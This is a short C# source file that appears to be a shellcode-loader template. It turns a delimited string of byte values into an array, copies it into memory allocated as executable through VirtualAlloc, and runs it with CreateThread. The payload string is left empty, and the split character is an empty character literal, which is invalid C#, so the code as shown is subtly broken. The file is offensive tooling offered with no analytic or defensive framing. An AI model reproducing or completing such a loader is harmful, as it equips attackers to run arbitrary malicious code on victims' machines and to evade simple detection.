using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Win32
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadid);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            string payload = "";

            string[] temp_payload = payload.Split('');

            byte[] final_payload = new byte[temp_payload.Length];

            for (int i = 0; i < temp_payload.Length; i++)
            {
                final_payload[i] = Convert.ToByte(temp_payload[i]);
            }

            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(final_payload, 0, funcAddr, final_payload.Length);
            IntPtr nThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(nThread, 0xffffffff);
        }
    }
}
